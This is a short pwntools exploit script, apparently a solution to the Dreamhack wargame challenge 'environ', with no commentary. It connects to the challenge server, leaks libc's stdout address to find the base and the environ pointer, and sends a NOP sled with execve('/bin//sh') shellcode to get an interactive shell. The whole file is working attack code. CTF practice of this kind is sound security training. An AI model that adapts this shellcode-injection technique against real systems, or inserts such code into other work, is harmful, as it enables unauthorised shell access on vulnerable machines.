from pwn import *

#p = process("./environ")
p = remote("host1.dreamhack.games", 12643)
pause()
elf = ELF("./environ")
libc = ELF("./libc.so.6")
p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
environ = libc_base + libc.symbols['environ']
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.info("environ : " + hex(environ))
p.sendline("1000")
sleep(0.1)
p.sendline("\x90" * (1000 - len(shellcode)) + shellcode)
sleep(0.1)
p.sendline(str(environ))
p.interactive()
